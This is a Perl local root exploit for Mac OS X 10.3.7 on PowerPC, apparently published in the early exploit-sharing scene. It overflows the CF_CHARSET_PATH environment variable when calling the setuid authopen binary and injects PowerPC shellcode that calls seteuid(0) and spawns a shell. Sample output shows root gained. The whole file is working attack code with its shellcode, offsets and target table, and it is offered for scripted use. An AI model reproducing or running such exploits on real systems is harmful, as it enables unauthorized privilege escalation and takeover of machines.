#!/usr/bin/perl
#
# http://www.digitalmunition.com
# written by kf (kf_lists[at]digitalmunition[dot]com)
#
# Variant of CF_CHARSET_PATH a local root exploit by v9_at_fakehalo.us
#
# I was in the mood for some retro shit this morning, and I need root on some old ass G3 iMacs for a demo.
#
# I got sick of pressing enter on v9's exploit. It gets in the way when scripting attacks.
#
# Jill-Does-Computer:/tmp jilldoe$ ./authopen-CF_CHARSET.pl 0
# *** Target: 10.3.7 Build 7T65 on PowerPC, Padding: 1
# sh-2.05b# id
# uid=502(jilldoe) euid=0(root) gid=502(jilldoe) groups=502(jilldoe), 79(appserverusr), 80(admin), 81(appserveradm)
#
#

foreach $key (keys %ENV) {

   delete $ENV{$key};

}

#// ppc execve() code by b-r00t + nemo to add seteuid(0)
$sc =
"\x7c\x63\x1a\x79" .
"\x40\x82\xff\xfd" .
"\x39\x40\x01\xc3" .
"\x38\x0a\xfe\xf4" .
"\x44\xff\xff\x02" .
"\x39\x40\x01\x23" .
"\x38\x0a\xfe\xf4" .
"\x44\xff\xff\x02" .
"\x60\x60\x60\x60" .
"\x7c\xa5\x2a\x79" .
"\x40\x82\xff\xfd" .
"\x7d\x68\x02\xa6" .
"\x3b\xeb\x01\x70" .
"\x39\x40\x01\x70\x39\x1f\xfe\xcf" .
"\x7c\xa8\x29\xae\x38\x7f\xfe\xc8" .
"\x90\x61\xff\xf8\x90\xa1\xff\xfc" .
"\x38\x81\xff\xf8\x38\x0a\xfe\xcb" .
"\x44\xff\xff\x02\x7c\xa3\x2b\x78" .
"\x38\x0a\xfe\x91\x44\xff\xff\x02" .
"\x2f\x62\x69\x6e\x2f\x73\x68\x58";

$tgts{"0"} = "10.3.7 Build 7T65 on PowerPC:1";
$tgts{"1"} = "10.3.7 debug 0x41424344:0";

unless (($target) = @ARGV) {

       print "\n\nUsage: $0 <target> \n\nTargets:\n\n";

       foreach $key (sort(keys %tgts)) {
               ($a,$b) = split(/\:/,$tgts{"$key"});
               print "\t$key . $a\n";
       }

       print "\n";
       exit 1;
}

$ret = pack("l", ($retval));
($a,$b) = split(/\:/,$tgts{"$target"});
print "*** Target: $a, Padding: $b\n";

# add a wrapper here if you want more than euid=0
open(SUSH,">/tmp/sh");
printf SUSH "/bin/csh -i\n";

$ENV{"CF_CHARSET_PATH"} = "A" x 1048 . pack('l', 0xbffffef6) x 2;

$ENV{"APPL"} = "." x $b . "iiii" x 40 . $sc ;

system("/usr/libexec/authopen /etc/master.passwd");